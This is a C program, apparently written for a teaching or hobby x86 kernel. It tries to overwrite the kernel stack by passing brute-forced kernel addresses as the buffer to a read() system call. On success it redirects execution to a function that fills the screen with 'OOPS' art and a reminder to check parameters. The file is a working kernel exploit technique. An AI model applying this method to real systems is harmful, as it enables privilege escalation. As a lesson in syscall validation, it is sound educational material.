#include <stdio.h>
#include <stdint.h>
#include <syscall.h>

static const char *art = "\
                                                                                \n\
                                                                                \n\
      OOOOOOOOO          OOOOOOOOO     PPPPPPPPPPPPPPPPP      SSSSSSSSSSSSSSS   \n\
    OO:::::::::OO      OO:::::::::OO   P::::::::::::::::P   SS:::::::::::::::S  \n\
  OO:::::::::::::OO  OO:::::::::::::OO P::::::PPPPPP:::::P S:::::SSSSSS::::::S  \n\
 O:::::::OOO:::::::OO:::::::OOO:::::::OPP:::::P     P:::::PS:::::S     SSSSSSS  \n\
 O::::::O   O::::::OO::::::O   O::::::O  P::::P     P:::::PS:::::S              \n\
 O:::::O     O:::::OO:::::O     O:::::O  P::::P     P:::::PS:::::S              \n\
 O:::::O     O:::::OO:::::O     O:::::O  P::::PPPPPP:::::P  S::::SSSS           \n\
 O:::::O     O:::::OO:::::O     O:::::O  P:::::::::::::PP    SS::::::SSSSS      \n\
 O:::::O     O:::::OO:::::O     O:::::O  P::::PPPPPPPPP        SSS::::::::SS    \n\
 O:::::O     O:::::OO:::::O     O:::::O  P::::P                   SSSSSS::::S   \n\
 O:::::O     O:::::OO:::::O     O:::::O  P::::P                        S:::::S  \n\
 O::::::O   O::::::OO::::::O   O::::::O  P::::P                        S:::::S  \n\
 O:::::::OOO:::::::OO:::::::OOO:::::::OPP::::::PP          SSSSSSS     S:::::S  \n\
  OO:::::::::::::OO  OO:::::::::::::OO P::::::::P          S::::::SSSSSS:::::S  \n\
    OO:::::::::OO      OO:::::::::OO   P::::::::P          S:::::::::::::::SS   \n\
      OOOOOOOOO          OOOOOOOOO     PPPPPPPPPP           SSSSSSSSSSSSSSS     \n\
                                                                                \n\
                                                                                \n\
                     im in ur kernel, overwriting ur stack                      \n\
                                                                                \n\
                       remember to check your parameters~                       \n\
                                                                                \n\
                                                                                \n";

static void
kernel_clear(uint8_t attrib)
{
    char *screen = (char *)0xB8000;
    int count = 2048; /* Yes, just like that game. */
    while (count-- > 0) {
        *screen++ = ' ';
        *screen++ = attrib;
    }
}

static void
kernel_draw(const char *s)
{
    char *screen = (char *)0xB8000;
    int x = 0;
    int y = 0;
    for (; *s; ++s) {
        if (*s == '\n') {
            x = 0;
            y++;
        } else {
            int offset = (y * 80 + x) * 2;
            screen[offset] = *s;
            x++;
        }
    }
}

static void
evil(void)
{
    kernel_clear(0x1F);
    kernel_draw(art);
    while (1);
}

static uint32_t iret_context[5] = {
    (uint32_t)&evil,     /* EIP */
    (uint32_t)0x10,      /* CS (kernel) */
    (uint32_t)0x01,      /* EFLAGS (disable IF) */

    /* Actually we don't need these, but leave them in for fun. */
    (uint32_t)0x800000,  /* ESP */
    (uint32_t)0x18,      /* SS (kernel) */
};

static void
try_patch_kernel(uint32_t addr)
{
    /* Now that's what I call reflection! */
    int fd = create("wtf", OPEN_READ);

    /* Skip until we hit the correct offset */
    int offset = (uint32_t)&iret_context[0] - 0x8048000;
    while (offset-- > 0) {
        char dummy;
        read(fd, &dummy, 1);
    }

    /*
     * And now override what's on the kernel stack!
     * Note that if the patch is successful, we shouldn't
     * return from the read; it should directly jump
     * to the evil function.
     */
    int count = read(fd, (void *)(addr - sizeof(iret_context)), sizeof(iret_context));
    if (count == sizeof(iret_context)) {
        printf("[-] Patch at %x FAIL, wrong kernel stack\n", addr);
    } else {
        printf("[-] Patch at %x FAIL, looks like kernel is protected\n", addr);
    }

    /* Let's try again */
    close(fd);
}

int
main(void)
{
    /*
     * This would be a lot easier with a kernel stack
     * address leak, but since we don't have a reliable
     * way of doing it, let's just brute force it.
     */
    uint32_t start = 0x800000;
    while (start > 0x400000) {
        try_patch_kernel(start);
        start -= 0x2000;
    }

    printf("[-] Hmm, I guess your kernel is secure enough.\n");
    return 0;
}
